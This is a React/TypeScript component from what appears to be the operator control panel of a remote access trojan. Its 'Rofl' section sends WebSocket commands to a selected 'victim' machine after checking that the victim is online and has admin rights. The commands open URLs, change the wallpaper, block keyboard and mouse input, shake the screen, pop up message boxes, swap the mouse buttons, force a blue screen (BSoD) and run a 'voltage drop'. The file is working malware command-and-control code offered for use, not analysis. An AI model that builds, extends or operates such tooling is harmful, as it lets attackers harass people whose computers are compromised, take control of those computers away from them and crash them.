"use client";

import { useEffect } from "react";
import { useQueryClient } from "@tanstack/react-query";

import type { Victim } from "../../../api/victims";
import { showToast } from "../../../toast";
import { usePanelDetailView } from "../panel-detail-view-provider";
import { usePanelWS } from "../../../ws/ws-provider";
import { isVictimOnline } from "../../utils/victim-status";

export function RoflSection() {
   const detail = usePanelDetailView();
   const ws = usePanelWS();
   const qc = useQueryClient();

   useEffect(() => {
      const urlInput = document.getElementById("roflUrlInput") as HTMLInputElement | null;
      const openBtn = document.getElementById("roflOpenBtn") as HTMLButtonElement | null;

      const bgInput = document.getElementById("roflBgUrlInput") as HTMLInputElement | null;
      const bgBtn = document.getElementById("roflChangeBtn") as HTMLButtonElement | null;

      const blockOnBtn = document.getElementById("roflBlockOnBtn") as HTMLButtonElement | null;
      const blockOffBtn = document.getElementById("roflBlockOffBtn") as HTMLButtonElement | null;

      const shakeOnBtn = document.getElementById("roflShakeOnBtn") as HTMLButtonElement | null;
      const shakeOffBtn = document.getElementById("roflShakeOffBtn") as HTMLButtonElement | null;

      const swapLeftRightBtn = document.getElementById("roflSwapLeftRightBtn") as HTMLButtonElement | null;
      const swapRightLeftBtn = document.getElementById("roflSwapRightLeftBtn") as HTMLButtonElement | null;

      const bsodBtn = document.getElementById("roflBsodBtn") as HTMLButtonElement | null;
      const voltageBtn = document.getElementById("roflVoltageBtn") as HTMLButtonElement | null;

      const msgIconSelect = document.getElementById("roflMsgIcon") as HTMLSelectElement | null;
      const msgHeaderInput = document.getElementById("roflMsgHeader") as HTMLInputElement | null;
      const msgContentInput = document.getElementById("roflMsgContent") as HTMLTextAreaElement | null;
      const msgButtonsSelect = document.getElementById("roflMsgButtons") as HTMLSelectElement | null;
      const msgSendBtn = document.getElementById("roflMsgSendBtn") as HTMLButtonElement | null;

      if (!urlInput || !openBtn) return;

      let roflFloodUntil = 0;
      let roflWindowStart = 0;
      let roflCmdCount = 0;

      const isValidUrl = (value: string): boolean => {
         const raw = String(value || "").trim();
         if (!raw) {
            showToast("warning", "Enter URL");
            return false;
         }
         try {
            if (!/^https?:\/\//i.test(raw)) {
               throw new Error("no scheme");
            }
            const u = new URL(raw);
            const host = String(u.hostname || "").trim();
            if (!host || !host.includes(".") || !/[a-zA-Z]/.test(host)) {
               throw new Error("bad host");
            }
            return true;
         } catch {
            showToast("error", "Invalid URL format");
            return false;
         }
      };

      const ensureVictim = (): string | null => {
         const victimId = detail.selectedVictimId;
         if (!victimId) {
            showToast("error", "Select victim first");
            return null;
         }
         return String(victimId);
      };

      const getSelectedVictim = (): Victim | null => {
         const victimId = detail.selectedVictimId;
         if (!victimId) return null;
         const data = qc.getQueryData(["victims"]);
         const list = Array.isArray(data) ? (data as Victim[]) : [];
         const v = list.find((x) => String((x as { id?: unknown }).id || "") === String(victimId));
         return v || null;
      };

      const ensureVictimOnline = (): boolean => {
         try {
            const victim = getSelectedVictim();
            if (victim && !isVictimOnline(victim)) {
               showToast("error", "Victim offline");
               return false;
            }
         } catch {
         }
         return true;
      };

      const ensureVictimAdmin = (): boolean => {
         try {
            const victim = getSelectedVictim();
            const admin = victim ? (victim as { admin?: unknown }).admin : undefined;
            if (!victim || admin !== true) {
               showToast("error", "No administrator rights");
               return false;
            }
         } catch {
            showToast("error", "No administrator rights");
            return false;
         }
         return true;
      };

      const ensureWs = (): boolean => {
         if (ws.state !== "open") {
            showToast("error", "WebSocket is not connected");
            return false;
         }
         return true;
      };

      const sendCommand = (cmd: string, successText?: string) => {
         if (!ensureWs()) return false;
         const victimId = ensureVictim();
         if (!victimId) return false;

         const ok = ws.sendJson({
            type: "command",
            victim_id: String(victimId),
            command: String(cmd || ""),
         });

         if (!ok) {
            showToast("error", "Failed to send command");
            return false;
         }
         if (successText) {
            showToast("success", successText);
         }
         return true;
      };

      const onOpen = () => {
         const raw = String(urlInput.value || "").trim();
         if (!isValidUrl(raw)) return;
         if (!ensureWs()) return;
         if (!ensureVictimOnline()) return;
         const victimId = ensureVictim();
         if (!victimId) return;

         const ok = sendCommand(raw, "Open url command sent");
         if (ok) urlInput.value = "";
      };

      const onBlockOn = () => {
         if (!ensureWs()) return;
         if (!ensureVictimAdmin()) return;
         sendCommand("block_input_on");
      };

      const onBlockOff = () => {
         if (!ensureWs()) return;
         if (!ensureVictimAdmin()) return;
         sendCommand("block_input_off");
      };

      const onBg = () => {
         if (!bgInput || !bgBtn) return;
         const raw = String(bgInput.value || "").trim();
         if (!isValidUrl(raw)) return;
         if (!ensureWs()) return;
         if (!ensureVictimOnline()) return;
         const ok = sendCommand(`bg:${raw}`, "Change background command sent");
         if (ok) bgInput.value = "";
      };

      const onMsg = () => {
         if (!msgSendBtn) return;
         if (!ensureWs()) return;
         if (!ensureVictimOnline()) return;
         const iconVal = msgIconSelect && msgIconSelect.value ? String(msgIconSelect.value).trim() : "info";
         const buttonsVal = msgButtonsSelect && msgButtonsSelect.value ? String(msgButtonsSelect.value).trim() : "ok";
         const headerVal = msgHeaderInput && msgHeaderInput.value ? String(msgHeaderInput.value).trim() : "";
         const contentVal = msgContentInput && msgContentInput.value ? String(msgContentInput.value).trim() : "";
         const cmd = `msgbox|${iconVal}|${buttonsVal}|${headerVal}|${contentVal}`;
         sendCommand(cmd, "Command sent successfully.");
      };

      const sendSwapCommand = (cmd: string, successText: string) => {
         if (!ensureWs()) return;
         if (!ensureVictimOnline()) return;
         sendCommand(cmd, successText);
      };

      const sendSimpleRoflCommand = (cmd: string, successText: string) => {
         const now = Date.now();
         if (now < roflFloodUntil) {
            showToast("error", "Don't flood");
            return;
         }
         if (!roflWindowStart || now - roflWindowStart > 3000) {
            roflWindowStart = now;
            roflCmdCount = 0;
         }
         roflCmdCount += 1;
         if (roflCmdCount > 5) {
            roflFloodUntil = now + 10000;
            showToast("error", "Don't flood");
            return;
         }

         if (!ensureWs()) return;
         if (!ensureVictimOnline()) return;
         sendCommand(cmd, successText);
      };

      openBtn.addEventListener("click", onOpen);
      if (blockOnBtn) blockOnBtn.addEventListener("click", onBlockOn);
      if (blockOffBtn) blockOffBtn.addEventListener("click", onBlockOff);
      if (bgBtn) bgBtn.addEventListener("click", onBg);
      if (msgSendBtn) msgSendBtn.addEventListener("click", onMsg);
      if (swapLeftRightBtn) {
         swapLeftRightBtn.addEventListener("click", () => {
            sendSwapCommand("swap_mouse_left_right", "Mouse buttons set: Left | Right");
         });
      }
      if (swapRightLeftBtn) {
         swapRightLeftBtn.addEventListener("click", () => {
            sendSwapCommand("swap_mouse_right_left", "Mouse buttons set: Right | Left");
         });
      }
      if (bsodBtn) {
         bsodBtn.addEventListener("click", () => {
            sendSimpleRoflCommand("bsod", "BSoD command sent");
         });
      }
      if (voltageBtn) {
         voltageBtn.addEventListener("click", () => {
            sendSimpleRoflCommand("voltage_drop", "Voltage drop command sent");
         });
      }
      if (shakeOnBtn) {
         shakeOnBtn.addEventListener("click", () => {
            sendSimpleRoflCommand("shake_on", "Shake screen: ON command sent");
         });
      }
      if (shakeOffBtn) {
         shakeOffBtn.addEventListener("click", () => {
            sendSimpleRoflCommand("shake_off", "Shake screen: OFF command sent");
         });
      }

      return () => {
         openBtn.removeEventListener("click", onOpen);
         if (blockOnBtn) blockOnBtn.removeEventListener("click", onBlockOn);
         if (blockOffBtn) blockOffBtn.removeEventListener("click", onBlockOff);
         if (bgBtn) bgBtn.removeEventListener("click", onBg);
         if (msgSendBtn) msgSendBtn.removeEventListener("click", onMsg);
      };
   }, [detail.selectedVictimId, qc, ws]);

   return (
      <div className="detail-section">
         <div className="grid gap-[18px]">
            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Open url</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="grid grid-cols-[1fr_max-content] gap-[10px]">
                     <input
                        id="roflUrlInput"
                        className="w-full rounded-[10px] border border-white/15 bg-black/40 px-[10px] py-[8px] text-[15px] text-white outline-none placeholder:text-white/60 focus:border-white/95"
                        placeholder="URL"
                     />
                     <button
                        id="roflOpenBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Open
                     </button>
                  </div>
                  <div className="mt-[10px] h-[2px] bg-[var(--line)]" />
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Change the background</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="grid grid-cols-[1fr_max-content] gap-[10px]">
                     <input
                        id="roflBgUrlInput"
                        className="w-full rounded-[10px] border border-white/15 bg-black/40 px-[10px] py-[8px] text-[15px] text-white outline-none placeholder:text-white/60 focus:border-white/95"
                        placeholder="URL"
                     />
                     <button
                        id="roflChangeBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Change
                     </button>
                  </div>
                  <div className="mt-[10px] h-[2px] bg-[var(--line)]" />
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Block input</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="flex gap-[12px]">
                     <button
                        id="roflBlockOnBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Turn on
                     </button>
                     <button
                        id="roflBlockOffBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Turn off
                     </button>
                  </div>
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Shake screen</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="flex gap-[12px]">
                     <button
                        id="roflShakeOnBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Turn on
                     </button>
                     <button
                        id="roflShakeOffBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Turn off
                     </button>
                  </div>
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Message box</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />

                  <div className="grid gap-[10px]">
                     <div className="grid grid-cols-[90px_1fr] items-center gap-[10px]">
                        <div className="text-[14px] font-bold text-white/85">Icon:</div>
                        <select id="roflMsgIcon" className="h-[34px] rounded-[10px] border border-white/15 bg-black/40 px-[10px] text-[14px] text-white outline-none">
                           <option value="info">Info</option>
                           <option value="error">Error</option>
                           <option value="warning">Warning</option>
                           <option value="question">Question</option>
                           <option value="none">None</option>
                        </select>
                     </div>

                     <div className="grid grid-cols-[90px_1fr] items-center gap-[10px]">
                        <div className="text-[14px] font-bold text-white/85">Header:</div>
                        <input
                           id="roflMsgHeader"
                           className="h-[34px] rounded-[10px] border border-white/15 bg-black/40 px-[10px] text-[14px] text-white outline-none placeholder:text-white/60 focus:border-white/95"
                           placeholder="Header text"
                        />
                     </div>

                     <div className="grid grid-cols-[90px_1fr] items-start gap-[10px]">
                        <div className="pt-[6px] text-[14px] font-bold text-white/85">Content:</div>
                        <textarea
                           id="roflMsgContent"
                           rows={3}
                           className="rounded-[10px] border border-white/15 bg-black/40 px-[10px] py-[8px] text-[14px] text-white outline-none placeholder:text-white/60 focus:border-white/95"
                           placeholder="Message content"
                        />
                     </div>

                     <div className="mt-[4px] h-[2px] bg-[var(--line)]" />

                     <div className="grid grid-cols-[90px_1fr_max-content] items-center gap-[10px]">
                        <div className="text-[14px] font-bold text-white/85">Buttons:</div>
                        <select id="roflMsgButtons" className="h-[34px] rounded-[10px] border border-white/15 bg-black/40 px-[10px] text-[14px] text-white outline-none">
                           <option value="ok">OK</option>
                           <option value="okcancel">OK / Cancel</option>
                           <option value="yesno">Yes / No</option>
                           <option value="yesnocancel">Yes / No / Cancel</option>
                           <option value="retrycancel">Retry / Cancel</option>
                           <option value="abortretryignore">Abort / Retry / Ignore</option>
                        </select>
                        <button
                           id="roflMsgSendBtn"
                           className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                           style={{ borderBottom: "4px solid var(--line)" }}
                        >
                           Send
                        </button>
                     </div>
                  </div>
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Swap Mouse Buttons</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="flex gap-[12px]">
                     <button
                        id="roflSwapLeftRightBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Left | Right
                     </button>
                     <button
                        id="roflSwapRightLeftBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        Right | Left
                     </button>
                  </div>
               </div>
            </div>

            <div className="w-[420px] max-w-[calc(100vw-420px)] rounded-[18px] border border-white/15 bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]">
               <div className="p-[6px_2px_2px]">
                  <div className="mb-[4px] text-[18px] font-extrabold text-white">Reboot</div>
                  <div className="mb-[10px] h-[2px] bg-[var(--line)]" />
                  <div className="flex gap-[12px]">
                     <button
                        id="roflBsodBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        BSoD
                     </button>
                     <button
                        id="roflVoltageBtn"
                        className="min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                        style={{ borderBottom: "4px solid var(--line)" }}
                     >
                        VOLTAGE DROP
                     </button>
                  </div>
               </div>
            </div>
         </div>
      </div>
   );
}
